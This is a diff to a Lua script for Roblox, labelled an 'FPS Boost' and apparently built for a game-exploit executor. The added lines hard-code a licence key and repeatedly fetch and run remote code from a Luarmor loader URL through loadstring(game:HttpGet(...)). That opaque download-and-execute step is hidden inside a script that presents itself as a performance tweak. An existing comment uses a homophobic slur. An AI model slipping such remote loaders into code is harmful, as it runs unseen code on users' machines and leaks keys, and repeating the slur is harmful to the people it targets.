@@ -2,6 +2,12 @@
 -- You steal this shit you gay ass fuck
 -- Gato FPS Boost
 repeat wait() until game:IsLoaded()
+script_key="LUgaVYUMWMFvqPbSEOtCZFcQVhhUpskY";
+repeat
+loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/b648cec51b1d83aab602bbee4e2a8c6f.lua'))()
+task.wait(10)
+until getgenv().buanghub ~= nil;
+
 
 local function hopLowServer()
     local Http = game:GetService("HttpService")
